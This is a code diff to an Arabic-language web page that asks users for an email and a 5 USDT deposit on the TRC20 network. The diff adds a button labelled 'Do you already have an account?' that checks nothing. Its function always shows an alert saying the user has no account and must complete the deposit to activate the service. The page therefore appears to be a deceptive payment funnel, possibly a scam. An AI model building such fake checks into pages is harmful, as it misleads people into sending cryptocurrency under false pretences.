@@ -105,6 +105,28 @@
             box-shadow: 0 4px 15px rgba(243, 186, 47, 0.3);
             transition: 0.2s;
         }
+
+        /* تنسيق زر التحقق من الحساب المسبق */
+        .check-account-btn {
+            font-family: 'Cairo', sans-serif;
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #a29bfe;
+            border: 1px dashed #4a3f85; 
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 14px;
+            margin-top: 15px; 
+            margin-bottom: 5px; 
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .check-account-btn:hover {
+            background: #1d1836;
+            color: #fff;
+            border-color: #6c5ce7;
+        }
     </style>
 </head>
 <body>
@@ -122,6 +144,9 @@
                     <input type="text" id="username" required placeholder="example@gmail.com" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                 </div>
                 <button type="button" onclick="goToStep2()" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; background: linear-gradient(to right, #7b2cbf, #9d4edd); color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer;">متابعة إلى الإيداع</button>
+                
+                <!-- الزر الجديد مضاف في مكان الدائرة الحمراء تماماً -->
+                <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                 
                 <img src="logo.png" alt="logo" class="bottom-logo">
             </div>
@@ -162,6 +187,11 @@
         copyText.setSelectionRange(0, 99999);
         navigator.clipboard.writeText(copyText.value);
         alert("تم نسخ عنوان المحفظة! قم بالتحويل من OKX أو أي محفظة أخرى على شبكة TRC20 بقيمة 5 USDT.");
+    }
+
+    // دالة التنبيه عند الضغط على الزر الجديد
+    function alertNoAccount() {
+        alert("أنت لا تمتلك حساباً مسبقاً، يرجى كتابة بريدك الإلكتروني وإتمام الإيداع لتفعيل الخدمة.");
     }
 </script>
 </body>
